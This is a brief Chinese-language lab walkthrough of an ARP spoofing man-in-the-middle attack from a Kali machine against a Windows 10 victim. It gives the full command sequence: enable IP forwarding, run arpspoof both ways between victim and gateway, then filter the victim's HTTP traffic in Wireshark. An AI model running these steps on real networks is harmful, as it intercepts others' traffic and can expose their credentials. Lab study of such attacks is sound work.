攻击机：kali2019_x64_en-us  
受害机：win10_pro_x64_zh-chs_commando  

用到的软件：  
0：arpspoof（kali中自带）  
1：wireshark（kali中自带）  

攻击机下：  
0：cat /proc/sys/net/ipv4/ip_forward # 查看是否开启ipv4的包转发，0为关闭，1为开启  

1：echo 1 > /proc/sys/net/ipv4/ip_forward # 开启ipv4的包转发  

2：修改文件/etc/sysctl.conf，取消注释net.ipv4.ip_forward=1这行 # 永久开启ipv4的包转发  

3：ifconfig -a # 查看当前网卡名称  

4：arpspoof -i eth0 -t 172.16.35.133 172.16.35.2 # 172.16.35.133是受害机的ip，172.16.35.2是网关ip，让受害机（172.16.35.133）以为网关（172.16.35.2）是我  

5：arpspoof -i eth0 -t 172.16.35.2 172.16.35.133 # 这条命令中将受害者ip和网关ip互换，让网关（172.16.35.2）以为受害机（172.16.35.133）是我  

6：让子弹飞一会（让mac欺骗的流量跑一会）  

7：打开并启动wireshark后，设置过滤器为http and ip.addr==111.26.219.37 # 其中111.26.219.37为受害机访问的网站，注意这里是双等号不是单等号  

8：wireshark过滤器总结  
http and ip.addr==111.26.219.37 and tcp.port==9090  

受害机下：  
0：访问目标网站  
